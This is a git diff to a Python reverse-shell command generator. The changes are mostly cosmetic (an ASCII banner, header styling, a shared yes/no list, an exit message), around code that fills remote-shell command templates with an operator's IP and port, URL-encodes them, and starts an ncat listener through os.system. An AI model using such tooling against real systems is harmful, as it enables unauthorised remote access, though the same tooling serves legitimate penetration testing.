@@ -9,8 +9,16 @@ from typing import List
 
 import readchar
 from colorama import Fore, Style
-from pyperclip import copy
 from netifaces import *
+from pyperclip import copy
+
+banner = '''
+                         __         __   __                  
+  ____ ___  _  __  ___  / /  ___   / /  / /  ___ _ ___   ___ 
+ / __// -_)| |/ / (_-< / _ \/ -_) / /  / /  / _ `// -_) / _ \\
+/_/   \__/ |___/ /___//_//_/\__/ /_/  /_/   \_, / \__/ /_//_/
+                                           /___/
+'''
 
 success = Style.BRIGHT + '[ ' + Fore.GREEN + '+' + Fore.RESET + ' ] ' + Style.RESET_ALL
 information = Style.BRIGHT + '[ ' + Fore.YELLOW + '!' + Fore.RESET + ' ] ' + Style.RESET_ALL
@@ -22,7 +30,8 @@ port = 443
 shell = '/bin/sh'
 command_key = 'nc plain'
 
-header_template = Template('\n' + Style.BRIGHT + '===== || ' + Fore.CYAN + '$param' + Fore.RESET + ' || =====' + Style.RESET_ALL + '\n')
+header_template = Template('\n' + Style.BRIGHT + '---------- [ ' + Fore.CYAN + '$param' +
+                           Fore.RESET + ' ] ----------' + Style.RESET_ALL + '\n')
 
 shells = {
     'sh': '/bin/sh',
@@ -63,6 +72,8 @@ commands = {
                            '$stream.Flush()};$client.Close()')
 }
 
+choices = ['no', 'yes']
+
 
 def is_valid(param_ip):
     try:
@@ -73,7 +84,7 @@ def is_valid(param_ip):
 
 
 def exit_program():
-    print('\n' + success + 'Bye friend, hope to see you soon!')
+    print('\n' + success + 'Goodbye, friend.')
     exit(0)
 
 
@@ -130,7 +141,6 @@ def specify_ip():
                 break
             else:
                 print(failure + 'Please, specify a valid IP address!')
-    
 
 
 def specify_port():
@@ -138,7 +148,8 @@ def specify_port():
     while True:
         try:
             global port
-            input_port = input(Style.BRIGHT + '[ default ' + Fore.GREEN + str(port) + Fore.RESET + ' ]' + Style.RESET_ALL + ' : ')
+            input_port = input(Style.BRIGHT + '[ default ' + Fore.GREEN + str(port) +
+                               Fore.RESET + ' ]' + Style.RESET_ALL + ' : ')
             if input_port.__eq__(''):
                 break
             elif int(input_port) in range(1, 65535):
@@ -169,8 +180,7 @@ def select_shell():
 def build_command():
     command = commands.get(command_key).safe_substitute(ip=ip, port=port, shell=shell)
     print(header_template.safe_substitute(param='URL ENCODE'))
-    options = ['no', 'yes']
-    result = select(options)
+    result = select(choices)
     if result == 1:
         command = urllib.parse.quote_plus(command)
         print(information + 'Command is now URL encoded!')
@@ -188,16 +198,17 @@ def build_command():
 
 def setup_listener():
     print(header_template.safe_substitute(param='SETUP LISTENER'))
-    options = ['no', 'yes']
-    result = select(options)
+    result = select(choices)
     if result == 1:
-        print('\n' + information + 'Launching /usr/bin/ncat ...' + '\n')
-        os.system('/usr/bin/ncat -nlvp ' + str(port))
+        print('\n' + information + 'Launching ncat ...' + '\n')
+        os.system('$(which ncat) -nlvp ' + str(port))
     else:
         exit_program()
 
 
 if __name__ == '__main__':
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print(banner)
     try:
         specify_ip()
         specify_port()
